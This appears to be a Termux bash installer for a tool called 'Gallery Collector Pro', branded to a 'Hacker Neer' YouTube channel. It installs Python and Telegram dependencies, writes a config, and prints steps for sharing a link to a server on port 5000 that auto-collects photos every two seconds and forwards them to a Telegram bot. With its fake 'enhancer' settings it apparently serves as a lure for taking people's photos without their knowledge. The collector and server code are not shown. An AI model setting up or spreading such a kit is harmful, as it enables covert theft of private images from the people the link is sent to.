#!/bin/bash

echo "╔══════════════════════════════════════════════════════════╗"
echo "║     📸 Gallery Collector Pro - By Hacker Neer          ║"
echo "║     🔗 https://youtube.com/@hackerneer                 ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

echo "🚀 Installing Gallery Collector Pro..."

# Update packages
pkg update -y && pkg upgrade -y

# Install dependencies
pkg install -y python git termux-api termux-services

# Install Python packages
pip install flask flask-cors pygithub watchdog python-telegram-bot requests pillow

# Create directories
mkdir -p templates static collected uploads

# Create config
cat > config.json << 'EOF'
{
    "scan_interval": 2,
    "port": 5000,
    "collect_folder": "collected",
    "upload_folder": "uploads",
    "min_file_size": 10240,
    "image_extensions": [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"],
    "enhancement_time": 5,
    "secret_key": "enhancer_pro_2024",
    "telegram": {
        "bot_token": "YOUR_BOT_TOKEN_HERE",
        "chat_id": "YOUR_CHAT_ID_HERE",
        "enabled": true
    },
    "credit": {
        "name": "Hacker Neer",
        "youtube": "https://youtube.com/@hackerneer",
        "channel_id": "@hackerneer"
    }
}
EOF

echo ""
echo "✅ Installation Complete!"
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  📌 HOW TO USE:                                        ║"
echo "║  1. Edit config.json - Add Telegram token              ║"
echo "║  2. Start collector: python collector.py &             ║"
echo "║  3. Start server: python server.py                     ║"
echo "║  4. Share link: http://YOUR_IP:5000                   ║"
echo "║  5. Dashboard: http://YOUR_IP:5000/dashboard         ║"
echo "║                                                       ║"
echo "║  📸 Photos auto-collect every 2 seconds              ║"
echo "║  🤖 Photos sent to Telegram automatically            ║"
echo "║                                                       ║"
echo "║  🔗 YouTube: https://youtube.com/@hackerneer         ║"
echo "╚══════════════════════════════════════════════════════════╝"